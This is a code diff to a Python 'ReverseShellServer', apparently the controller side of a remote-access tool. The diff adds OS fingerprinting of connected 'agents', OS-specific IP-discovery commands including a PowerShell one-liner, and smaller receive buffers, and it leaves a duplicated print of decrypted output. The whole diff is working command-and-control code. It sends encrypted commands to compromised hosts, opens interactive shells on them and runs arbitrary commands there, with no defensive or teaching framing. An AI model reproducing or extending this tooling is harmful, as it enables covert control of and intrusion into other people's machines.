@@ -23,12 +23,13 @@ class ReverseShellServer:
         client_id = 1
         while True:
             conn, addr = self.server_socket.accept()
-            hostname = self.get_hostname(conn)
-            print(f"[+] Connection from {addr} (hostname: {hostname})")
+            hostname, os_type = self.get_client_info(conn)
+            print(f"[+] Connection from {addr} (hostname: {hostname}, OS: {os_type})")
             self.clients[client_id] = conn
             self.client_id_map[client_id] = {
                 "address": addr,
                 "hostname": hostname,
+                "os": os_type,
                 "connection": conn,
             }
             client_thread = threading.Thread(
@@ -37,14 +38,16 @@ class ReverseShellServer:
             client_thread.start()
             client_id += 1
 
-    def get_hostname(self, conn):
+    def get_client_info(self, conn):
         try:
-            conn.send(AESCipher.encrypt("hostname").encode("utf-8"))
-            hostname = conn.recv(4096).decode("utf-8")
-            return AESCipher.decrypt(hostname).strip()
+            conn.send(AESCipher.encrypt("client_info").encode("utf-8"))
+            data = conn.recv(4096).decode("utf-8")
+            decrypted_data = AESCipher.decrypt(data)
+            hostname, os_type = decrypted_data.split("|")
+            return hostname.strip(), os_type.strip()
         except Exception as e:
-            print(f"[!] Failed to get hostname: {e}")
-            return "Unknown"
+            print(f"[!] Failed to get client info: {e}")
+            return "Unknown", "Unknown"
 
     def handle_client(self, conn, addr, client_id):
         try:
@@ -95,7 +98,9 @@ class ReverseShellServer:
     def list_clients(self):
         print("\n[+] Active agents:")
         for client_id, info in self.client_id_map.items():
-            print(f"[+] {client_id}: {info['address']} (hostname: {info['hostname']})")
+            print(
+                f"[+] {client_id}: {info['address']} (hostname: {info['hostname']}, OS: {info['os']})"
+            )
         print()
 
     def handle_agent_command(self, command):
@@ -123,17 +128,22 @@ class ReverseShellServer:
             elif agent_command == "shell":
                 self.interactive_shell(conn)
             elif agent_command == "ipconfig":
-                self.handle_ipconfig(conn)
+                self.handle_ipconfig(conn, client_id)
             else:
                 self.send_command(agent_command + " " + args, conn)
         else:
             print(f"[x] Error: Client {client_id} not found")
 
-    def handle_ipconfig(self, conn):
-        conn.send(AESCipher.encrypt("ipconfig").encode("utf-8"))
+    def handle_ipconfig(self, conn, client_id):
+        os_type = self.client_id_map[client_id]["os"]
+        if os_type == "Windows":
+            command = "powershell -Command \"Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne 'Disconnected' } | Select-Object -ExpandProperty IPv4Address | Select-Object -ExpandProperty IPAddress\""
+        else:
+            command = "hostname -I | awk '{print $1}'"
+        conn.send(AESCipher.encrypt(command).encode("utf-8"))
         data = b""
         while True:
-            part = conn.recv(4096)
+            part = conn.recv(1024)
             if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                 data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                 break
@@ -200,13 +210,14 @@ class ReverseShellServer:
         conn.send(AESCipher.encrypt(command).encode("utf-8"))
         data = b""
         while True:
-            part = conn.recv(4096)
+            part = conn.recv(1024)
             if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                 data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                 break
             data += part
         try:
             decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
+            print(decrypted_data)
             if decrypted_data:
                 print(decrypted_data)
         except Exception as e:
